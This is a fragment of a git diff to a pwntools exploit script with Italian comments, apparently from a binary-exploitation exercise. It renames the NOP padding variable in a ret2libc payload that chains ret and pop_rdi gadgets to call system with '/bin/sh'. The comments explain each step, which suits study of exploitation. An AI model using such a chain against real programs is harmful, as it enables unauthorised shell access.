@@ -6,7 +6,7 @@ from pwn import *
 #p64 lo uso perchè gli indirizzi non sono quelli che si aspetta il sistema, quindi li mette in un formato giusto e funzionante
 
 # nop slides, così sto sicuro, sovrascrivo il buffer
-nops = b"\x90"*216
+buf = b"\x90"*216
 
 #una volta che scopro l'indirizo di base della libc posso trovare facilmente dove sono le altre funzioni del sistema operativo con offset predeterminati
 #quindi posso fare un ROP e fare eseguire system e poi passarlgli bin sh 
@@ -69,7 +69,7 @@ ret = p64(libc_base_address + 0xbe2f9)
 #per allineare lo stack in casi dii problemi (se mi da seg fault ) devo aggiungere un gadget ret prima di pop_rdi
 
 #con nops raggioungo eip e lo sovrascrivo poi con ret, poi faccio pop_rdi mettendoci dentro bin sh e poi eseguo systems
-sys.stdout.buffer.write(nops + ret + pop_rdi + bin_sh + system)
+sys.stdout.buffer.write(buf + ret + pop_rdi + bin_sh + system)
 
 
 
